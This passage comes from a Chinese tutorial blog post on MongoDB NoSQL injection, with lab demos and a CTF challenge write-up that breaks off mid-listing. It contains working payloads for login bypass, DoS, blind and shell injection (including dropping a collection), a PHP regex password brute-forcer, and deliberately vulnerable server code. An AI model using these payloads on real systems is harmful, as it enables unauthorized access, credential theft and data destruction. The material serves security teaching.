src="/2019/08/11/NoSQL注入之MongoDB/17.png" alt=""></p><h3 id="JavaScript注入-where注入"><a href="#JavaScript注入-where注入" class="headerlink" title="JavaScript注入/$where注入"></a>JavaScript注入/$where注入</h3><h4 id="where"><a href="#where" class="headerlink" title="$where"></a>$where</h4><p>先看下\$where的概念，使用\$where运算符可以将包含JavaScript表达式的字符串或完整的JavaScript函数传递给MongoDB来执行，用法如下，筛选出user集合中用户admin的信息：</p><p><code>db.user.find({$where:function(){return (hex_md5(this.username)==&quot;21232f297a57a5a743894a0e4a801fc3&quot;)}})</code></p><p>这里环境用的是Github的一个项目：<a href="https://github.com/youngyangyang04/NoSQLInjectionAttackDemo" target="_blank" rel="noopener">https://github.com/youngyangyang04/NoSQLInjectionAttackDemo</a></p><p>本次Demo用的是login_1.php，并对其进行了修改，为了方便我也输出了拼接的语句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$stime=microtime(<span class="keyword">true</span>);</span><br><span class="line">$m = <span class="keyword">new</span> MongoClient();</span><br><span class="line">$db = $m-&gt;test;</span><br><span class="line">$collection = $db-&gt;user;</span><br><span class="line">$query_body =<span class="string">"function q() &#123;</span></span><br><span class="line"><span class="string">var username = '"</span>.$_REQUEST[<span class="string">"username"</span>].<span class="string">"';</span></span><br><span class="line"><span class="string">var password = '"</span>.$_REQUEST[<span class="string">"password"</span>].<span class="string">"';if(username == 'admin'&amp;&amp;password == 'password') return true; else&#123; return false;&#125;&#125;"</span>;  </span><br><span class="line"><span class="keyword">echo</span> $query_body;  </span><br><span class="line">$result = $collection-&gt;find(<span class="keyword">array</span>(<span class="string">'$where'</span>=&gt;$query_body));</span><br><span class="line">$count = $result-&gt;count();</span><br><span class="line">$cursor = $collection-&gt;find($result);</span><br><span class="line">$doc_failed = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$doc_failed-&gt;loadHTMLFile(<span class="string">"failed.html"</span>);</span><br><span class="line">$doc_succeed = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$doc_succeed-&gt;loadHTMLFile(<span class="string">"succeed.html"</span>);</span><br><span class="line"><span class="keyword">if</span>($count&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> $doc_succeed-&gt;saveHTML();</span><br><span class="line"><span class="keyword">foreach</span> ($cursor <span class="keyword">as</span> $user)&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">'username:'</span>.$user[<span class="string">'username'</span>].<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">'password:'</span>.$user[<span class="string">'password'</span>].<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> $doc_failed-&gt;saveHTML();</span><br><span class="line">&#125;</span><br><span class="line">$etime=microtime(<span class="keyword">true</span>);</span><br><span class="line">$total=$etime-$stime;</span><br><span class="line">$str_total = var_export($total, <span class="keyword">TRUE</span>);</span><br><span class="line"><span class="keyword">if</span>(substr_count($str_total,<span class="string">"E"</span>))&#123;</span><br><span class="line">$float_total = floatval(substr($str_total,<span class="number">5</span>));</span><br><span class="line">$total = $float_total/<span class="number">100000</span>;</span><br><span class="line"><span class="keyword">echo</span> $total.<span class="string">'seconds'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">echo</span> $total.<span class="string">'seconds'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们先访问demo_1.html，是个登录界面：</p><p><img src="/2019/08/11/NoSQL注入之MongoDB/18.png" alt=""></p><p>随便输入用户密码登陆，显示错误（这里方便看输入构造处理的语句就没有注释掉输出）：</p><p><img src="/2019/08/11/NoSQL注入之MongoDB/19.png" alt=""></p><h4 id="绕过登录验证"><a href="#绕过登录验证" class="headerlink" title="绕过登录验证"></a>绕过登录验证</h4><p>针对注入内容所在语句的位置构造返回true的逻辑，即可绕过登录验证：</p><p><code>?username=test&amp;password=a&#39;;return true;var c=&#39;</code></p><p><img src="/2019/08/11/NoSQL注入之MongoDB/20.png" alt=""></p><h4 id="DoS"><a href="#DoS" class="headerlink" title="DoS"></a>DoS</h4><p>除此之外，还能进行DoS攻击，使目标服务器CPU短暂飙升：</p><p><code>?username=test&amp;password=a&#39;;(function(){var date=new Date();do{curDate=new Date();}while(curDate-date&lt;5000);return Math.max();})();var c=&#39;</code></p><p>可看到程序跑了25s才停止，若当时看目标服务器CPU会发现飙升：</p><p><img src="/2019/08/11/NoSQL注入之MongoDB/21.png" alt=""></p><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><h4 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h4><p>基于时间的盲注，是使用sleep()函数结合闭合语句的方式实现的，看前面联合查询注入中的示例就知道了，这里不再多说：</p><p><code>?username=test&#39;});if (db.version()&gt;&quot;0&quot;){sleep(10000);exit;}var b=({a:&#39;1&amp;password=test</code></p><p>有个注意点：这种盲注技巧仅在闭合的情况下可行，用注释符注释后面的语句的情况是行不通的。</p><h4 id="基于布尔的盲注"><a href="#基于布尔的盲注" class="headerlink" title="基于布尔的盲注"></a>基于布尔的盲注</h4><p>基于布尔的盲注，主要是根据字符正确和错误返回不同，利用$regex操作符逐个正则匹配抓取字符，直至将整个字符串匹配出来。</p><p>下面看个例子理解一下。</p><p>这里我们还是用的这个Github项目：<a href="https://github.com/youngyangyang04/NoSQLInjectionAttackDemo" target="_blank" rel="noopener">https://github.com/youngyangyang04/NoSQLInjectionAttackDemo</a></p><p>对login.php进行如下修改：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   $m = <span class="keyword">new</span> MongoClient();</span><br><span class="line">   $db = $m-&gt;test;</span><br><span class="line">   $collection = $db-&gt;user;</span><br><span class="line">   $dbUsername = <span class="keyword">null</span>;</span><br><span class="line">   $dbPassword = <span class="keyword">null</span>;</span><br><span class="line">   $data = <span class="keyword">array</span>(</span><br><span class="line">      <span class="string">'username'</span> =&gt;  $_REQUEST[<span class="string">'username'</span>],</span><br><span class="line">      <span class="string">'password'</span> =&gt;  $_REQUEST[<span class="string">'password'</span>]</span><br><span class="line">   ); </span><br><span class="line">   $cursor = $collection-&gt;find($data);</span><br><span class="line">   $string = json_encode($data);</span><br><span class="line">   <span class="comment">// echo $string.'&lt;br&gt;';</span></span><br><span class="line">   $count = $cursor-&gt;count();</span><br><span class="line">   $doc_failed = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">   $doc_failed-&gt;loadHTMLFile(<span class="string">"failed.html"</span>);</span><br><span class="line">   $doc_succeed = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">   $doc_succeed-&gt;loadHTMLFile(<span class="string">"succeed.html"</span>);</span><br><span class="line">   <span class="keyword">if</span>($count &gt;<span class="number">0</span> )&#123;</span><br><span class="line">      <span class="keyword">echo</span> $doc_succeed-&gt;saveHTML();</span><br><span class="line">      <span class="keyword">foreach</span> ($cursor <span class="keyword">as</span> $user)&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">'Welcome! '</span>.$user[<span class="string">'username'</span>].<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> $doc_failed-&gt;saveHTML();</span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问界面：</p><p><img src="/2019/08/11/NoSQL注入之MongoDB/22.png" alt=""></p><p>随便输入用户账号密码登录之后，显示登录错误：</p><p><img src="/2019/08/11/NoSQL注入之MongoDB/23.png" alt=""></p><p>我们可以$ne来进行重言式注入来绕过登录认证逻辑，可以看到成功登录：</p><p><code>?username[$ne]=test&amp;password[$ne]=test</code></p><p><img src="/2019/08/11/NoSQL注入之MongoDB/24.png" alt=""></p><p>虽然前面成功绕过登录校验，显示了所有用户名，但如果我们想知道管理员用户admin的密码具体为多少时，此时就需要使用$regex匹配盲注来获取：</p><p><code>?username=admin&amp;password[$regex]=^I</code></p><p><img src="/2019/08/11/NoSQL注入之MongoDB/25.png" alt=""></p><p>写个脚本跑一下就出来了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch,CURLOPT_URL,<span class="string">'http://127.0.0.1/NoSQLInjectionAttackDemo/login/login.php'</span>);</span><br><span class="line">curl_setopt($ch,CURLOPT_RETURNTRANSFER,<span class="number">1</span>);</span><br><span class="line">curl_setopt($ch,CURLOPT_POST,<span class="number">1</span>);</span><br><span class="line">$ori = <span class="string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>;</span><br><span class="line">$str = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt;<span class="number">10</span> ; $i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; strlen($ori); $j++) &#123; </span><br><span class="line">        $post = <span class="string">'username=admin&amp;password[$regex]=^'</span>.$str.$ori[$j];</span><br><span class="line">        curl_setopt($ch,CURLOPT_POSTFIELDS,$post);</span><br><span class="line">        $data = curl_exec($ch);</span><br><span class="line">        <span class="comment">// echo $ori[$j].':'.strlen($data).'&lt;br&gt;';</span></span><br><span class="line">        <span class="keyword">if</span> (strlen($data) == <span class="number">297</span>) &#123;</span><br><span class="line">           $str .= $ori[$j];</span><br><span class="line">           <span class="keyword">echo</span> $str.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2019/08/11/NoSQL注入之MongoDB/26.png" alt=""></p><h3 id="MongoDB-Shell注入"><a href="#MongoDB-Shell注入" class="headerlink" title="MongoDB Shell注入"></a>MongoDB Shell注入</h3><p>MongoDB Shell注入，主要是使用execute()/executeCommand()方法执行拼接的MongoDB命令语句导致的。</p><p>execute()方法正和前面联合查询注入一样，这里说下executeCommand()方法的情景，因为这是MongoDB新版本的写法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$manager = <span class="keyword">new</span> MongoDB\Driver\Manager(<span class="string">'mongodb://mongo:27017'</span>);</span><br><span class="line">$username = $_GET[<span class="string">'username'</span>];</span><br><span class="line">$cmd = <span class="keyword">new</span> MongoDB\Driver\Command([</span><br><span class="line"><span class="string">'eval'</span>=&gt; <span class="string">"db.users.distinct('username',&#123;'username':'$username'&#125;)"</span></span><br><span class="line">]);</span><br><span class="line">$cursor = $manager-&gt;executeCommand(<span class="string">'test'</span>, $cmd)-&gt;toArray();</span><br><span class="line">var_dump($cursor);</span><br><span class="line"><span class="keyword">if</span>(count($cursor)&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Succeed!'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Failed!'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在数据库中建立users集合，初始化一条用户数据如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; db.users.find().pretty()</span><br><span class="line">&#123;</span><br><span class="line">&quot;_id&quot; : ObjectId(&quot;5d56b8469cea49dc4479cd6b&quot;),</span><br><span class="line">&quot;username&quot; : &quot;admin&quot;,</span><br><span class="line">&quot;password&quot; : &quot;123456&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正常访问：</p><p><img src="/2019/08/11/NoSQL注入之MongoDB/27.png" alt=""></p><h4 id="Shell注入插入文档"><a href="#Shell注入插入文档" class="headerlink" title="Shell注入插入文档"></a>Shell注入插入文档</h4><p>往users集合插入攻击者用户：</p><p><code>?username=1&#39;});db.users.insert({&quot;username&quot;:&quot;mi1k7ea&quot;,&quot;password&quot;:&quot;hacker&quot;});db.users.find({&#39;username&#39;:&#39;2</code></p><p><img src="/2019/08/11/NoSQL注入之MongoDB/28.png" alt=""></p><p>到后台连接MongoDB查看，确实插入数据了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt; db.users.find().pretty()</span><br><span class="line">&#123;</span><br><span class="line">&quot;_id&quot; : ObjectId(&quot;5d56b8469cea49dc4479cd6b&quot;),</span><br><span class="line">&quot;username&quot; : &quot;admin&quot;,</span><br><span class="line">&quot;password&quot; : &quot;123456&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">&quot;_id&quot; : ObjectId(&quot;5d56bb6812a5a3b11fddcc3e&quot;),</span><br><span class="line">&quot;username&quot; : &quot;mi1k7ea&quot;,</span><br><span class="line">&quot;password&quot; : &quot;hacker&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Shell注入删除集合"><a href="#Shell注入删除集合" class="headerlink" title="Shell注入删除集合"></a>Shell注入删除集合</h4><p>搞点破坏，删掉users集合：</p><p><code>?username=1&#39;});db.users.drop();db.users.find({&#39;username&#39;:&#39;2</code></p><p><img src="/2019/08/11/NoSQL注入之MongoDB/29.png" alt=""></p><p>到后台连接MongoDB查看的时候已经不存在users集合了。</p><h2 id="0x05-Node-js-MongoDB注入攻击"><a href="#0x05-Node-js-MongoDB注入攻击" class="headerlink" title="0x05 Node.js MongoDB注入攻击"></a>0x05 Node.js MongoDB注入攻击</h2><p>原理都差不多，这里就简单搞下Demo看看。</p><p>这里我用的是：<a href="https://github.com/bibotai/research_of_nosql_injection/tree/master/jsdemo" target="_blank" rel="noopener">https://github.com/bibotai/research_of_nosql_injection/tree/master/jsdemo</a></p><p>除此之外，还可参考更完整的Demo：<a href="https://github.com/ricardojoserf/NoSQL-injection-example" target="_blank" rel="noopener">https://github.com/ricardojoserf/NoSQL-injection-example</a></p><p>下载下来后，输入运行Node.js：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd jsdemo</span><br><span class="line">npm install</span><br><span class="line">node index.js</span><br></pre></td></tr></table></figure><p>index.js中关键JS代码如下，取请求体中Json格式的username和password键值作为从参数调用findOne()实现查询操作：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">app.post(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(req.body)</span><br><span class="line">User.findOne(&#123;<span class="attr">username</span>: req.body.username, <span class="attr">password</span>: req.body.password&#125;, <span class="function"><span class="keyword">function</span> (<span class="params">err, user</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(user)</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line"><span class="keyword">return</span> res.render(<span class="string">'index'</span>, &#123;<span class="attr">message</span>: err.message&#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!user) &#123;</span><br><span class="line"><span class="keyword">return</span> res.render(<span class="string">'index'</span>, &#123;<span class="attr">message</span>: <span class="string">'Sorry!'</span>&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> res.render(<span class="string">'index'</span>, &#123;<span class="attr">message</span>: <span class="string">'Welcome back '</span> + user.name + <span class="string">'!!!'</span>&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这里利用重言式注入即可绕过登录认证：</p><p><img src="/2019/08/11/NoSQL注入之MongoDB/30.png" alt=""></p><h2 id="0x06-Java-MongoDB注入攻击"><a href="#0x06-Java-MongoDB注入攻击" class="headerlink" title="0x06 Java MongoDB注入攻击"></a>0x06 Java MongoDB注入攻击</h2><p>都差不多，环境搭建可参考：</p><p><a href="https://github.com/aaoraa/nosql-injection-sample" target="_blank" rel="noopener">https://github.com/aaoraa/nosql-injection-sample</a></p><p><a href="https://github.com/shirishp/NoSQLInjectionDemo" target="_blank" rel="noopener">https://github.com/shirishp/NoSQLInjectionDemo</a></p><h2 id="0x07-题目——NopeSQL"><a href="#0x07-题目——NopeSQL" class="headerlink" title="0x07 题目——NopeSQL"></a>0x07 题目——NopeSQL</h2><p>这里看下CyBRICS CTF Quals 2019的NopeSQL题目：<a href="http://173.199.118.226/index.php" target="_blank" rel="noopener">http://173.199.118.226/index.php</a></p><p>打开是个提交用户名和密码的表单的界面：</p><p><img src="/2019/08/11/NoSQL注入之MongoDB/31.png" alt=""></p><p>先是拿sqlmap跑，发现没跑出啥名堂，结合题目名称推测应该是考察NoSQL注入知识，而NoSQL注入在CTF中一般是考察MongoDB注入攻击，除非是很简单的题目，不然一般是需要代码审计来进行构造注入的。</p><p>于是一番尝试，访问<code>http://173.199.118.226/.git/HEAD</code>会下载内容，说明存在.git源码泄露：</p><p><img src="/2019/08/11/NoSQL注入之MongoDB/32.png" alt=""></p><p>直接上lijiejie的神器GitHack下载解析源码文件：</p><p><img src="/2019/08/11/NoSQL注入之MongoDB/33.png" alt=""></p><p>下面就开始代码审计。</p><p>其实就只有一个index.php文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">"/vendor/autoload.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">    $collection = (<span class="keyword">new</span> MongoDB\Client(<span class="string">'mongodb://localhost:27017/'</span>))-&gt;test-&gt;users;</span><br><span class="line">    $raw_query = <span class="string">'&#123;"username": "'</span>.$username.<span class="string">'", "password": "'</span>.$password.<span class="string">'"&#125;'</span>;</span><br><span class="line">    $document = $collection-&gt;findOne(json_decode($raw_query));</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($document) &amp;&amp; <span class="keyword">isset</span>($document-&gt;password)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user = <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_COOKIE[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $user = auth($_COOKIE[<span class="string">'username'</span>], $_COOKIE[<span class="string">'password'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $user = auth($_POST[<span class="string">'username'</span>], $_POST[<span class="string">'password'</span>]);</span><br><span class="line">    <span class="keyword">if</span> ($user) &#123;</span><br><span class="line">        setcookie(<span class="string">'username'</span>, $_POST[<span class="string">'username'</span>]);</span><br><span class="line">        setcookie(<span class="string">'password'</span>, $_POST[<span class="string">'password'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> ($user == <span class="keyword">true</span>): <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    Welcome!</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        Group most common news by</span><br><span class="line">        &lt;a href=<span class="string">"?filter=$category"</span>&gt;category&lt;/a&gt; | </span><br><span class="line">        &lt;a href=<span class="string">"?filter=$public"</span>&gt;publicity&lt;/a&gt;&lt;br&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">        $filter = $_GET[<span class="string">'filter'</span>];</span><br><span class="line"></span><br><span class="line">        $collection = (<span class="keyword">new</span> MongoDB\Client(<span class="string">'mongodb://localhost:27017/'</span>))-&gt;test-&gt;news;</span><br><span class="line"></span><br><span class="line">        $pipeline = [</span><br><span class="line">            [<span class="string">'$group'</span> =&gt; [<span class="string">'_id'</span> =&gt; <span class="string">'$category'</span>, <span class="string">'count'</span> =&gt; [<span class="string">'$sum'</span> =&gt; <span class="number">1</span>]]],</span><br><span class="line">            [<span class="string">'$sort'</span> =&gt; [<span class="string">'count'</span> =&gt; <span class="number">-1</span>]],</span><br><span class="line">            [<span class="string">'$limit'</span> =&gt; <span class="number">5</span>],</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        $filters = [</span><br><span class="line">            [<span class="string">'$project'</span> =&gt; [<span class="string">'category'</span> =&gt; $filter]]</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        $cursor = $collection-&gt;aggregate(array_merge($filters, $pipeline));</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($filter)): <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="meta">&lt;?php</span></span><br><span class="line">            <span class="keyword">foreach</span> ($cursor <span class="keyword">as</span> $category) &#123;</span><br><span class="line">                    printf(<span class="string">"%s has %d news&lt;br&gt;"</span>, $category[<span class="string">'_id'</span>], $category[<span class="string">'count'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">else</span>: <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])): <span class="meta">?&gt;</span></span><br><span class="line">        Invalid username <span class="keyword">or</span> password</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &lt;form action=<span class="string">'/'</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"text"</span> name=<span class="string">"username"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"password"</span> name=<span class="string">"password"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"submit"</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    &lt;h2&gt;News&lt;/h2&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">        $collection = (<span class="keyword">new</span> MongoDB\Client(<span class="string">'mongodb://localhost:27017/'</span>))-&gt;test-&gt;news;</span><br><span class="line">        $cursor = $collection-&gt;find([<span class="string">'public'</span> =&gt; <span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">foreach</span> ($cursor <span class="keyword">as</span> $news) &#123;</span><br><span class="line">            printf(<span class="string">"%s&lt;br&gt;"</span>, $news[<span class="string">'title'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们拆分来看，分为两块逻辑，第一部分的逻辑是登录，定义了auth()函数来认证登录：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 